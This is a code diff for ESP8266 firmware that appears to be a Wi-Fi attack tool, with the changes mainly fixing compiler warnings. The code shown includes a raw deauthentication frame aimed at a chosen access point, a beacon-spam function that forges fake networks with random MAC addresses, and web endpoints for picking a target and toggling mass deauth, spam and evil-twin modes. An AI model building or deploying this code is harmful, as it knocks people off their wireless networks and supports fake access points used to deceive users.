@@ -6,7 +6,11 @@
 #include <Adafruit_SSD1306.h>
 #include "web_index.h"
 
-extern "C" { #include "user_interface.h" }
+/* --- FIX COMPILER ERROR --- */
+extern "C" {
+  #include "user_interface.h"
+}
+/* --------------------------- */
 
 Adafruit_SSD1306 display(64, 48, &Wire, -1);
 ESP8266WebServer server(80);
@@ -20,14 +24,13 @@ int targetCh=1, currentCh=1, beaconAmount=10;
 
 uint8_t deauthPkt[26] = { 0xC0,0x00,0x3A,0x01,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x00,0x00,0x01,0x00 };
 
-// BEACON SPAM FIX: Random MAC + TIM Parameter (HP Modern Support)
 void sendBeacon(String ssid, int ch) {
   uint8_t mac[6]; for(int i=0; i<6; i++) mac[i] = random(0,255); mac[0]=0x00;
   uint8_t packet[128] = { 0x80,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, mac[0],mac[1],mac[2],mac[3],mac[4],mac[5], mac[0],mac[1],mac[2],mac[3],mac[4],mac[5], 0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x64,0x00,0x31,0x04, 0x00,(uint8_t)ssid.length() };
   int pos = 38;
-  for(int i=0; i<ssid.length(); i++) packet[pos++] = ssid[i];
+  for(unsigned int i=0; i<ssid.length(); i++) packet[pos++] = ssid[i];
   uint8_t post[] = { 0x01,0x08,0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c, 0x03,0x01,(uint8_t)ch, 0x05,0x04,0x00,0x01,0x00,0x00 };
-  for(int i=0; i<sizeof(post); i++) packet[pos++] = post[i];
+  for(unsigned int i=0; i<sizeof(post); i++) packet[pos++] = post[i];
   wifi_send_pkt_freedom(packet, pos, 0);
 }
 
@@ -58,6 +61,7 @@ void setup() {
 
   server.on("/status", [](){ server.send(200, "application/json", "{\"m\":"+String(isMassKill)+",\"d\":"+String(isDeauth)+",\"s\":"+String(isSpam)+",\"e\":"+String(isEvil)+"}"); });
   server.on("/select", [](){ targetBSSID=server.arg("b"); targetCh=server.arg("c").toInt(); targetSSID=server.arg("s"); parseBytes(targetBSSID.c_str(),':',&deauthPkt[10],6,16); parseBytes(targetBSSID.c_str(),':',&deauthPkt[16],6,16); server.send(200); });
+  
   server.on("/upload", HTTP_POST, [](){ server.send(200); }, [](){
     HTTPUpload& u = server.upload();
     if(u.status == UPLOAD_FILE_START) fsUploadFile = SPIFFS.open(u.filename.startsWith("/")?u.filename:"/"+u.filename, "w");
